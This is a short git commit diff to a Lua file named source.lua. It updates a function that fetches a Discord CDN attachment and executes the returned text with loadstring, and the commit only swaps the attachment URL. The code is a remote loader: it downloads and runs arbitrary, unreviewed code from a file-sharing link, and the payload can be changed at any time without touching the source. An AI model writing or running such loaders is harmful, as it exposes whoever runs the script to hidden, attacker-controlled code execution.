bf46740a60a58e962ef280c46a62c17865efafee
lunafard <129810877+lunafard@users.noreply.github.com>
2023-04-25 04:09:53 -0400

    Update source.lua

--- source.lua
+++ source.lua
@@ -5,4 +5,4 @@ local function GetDiscord(Url)
    })
    return loadstring(responce.Body)()
 end
-GetDiscord("https://cdn.discordapp.com/attachments/1098723775232606330/1100329969273548820/message.txt")
+GetDiscord("https://cdn.discordapp.com/attachments/1098723775232606330/1100332688457613372/message.txt")
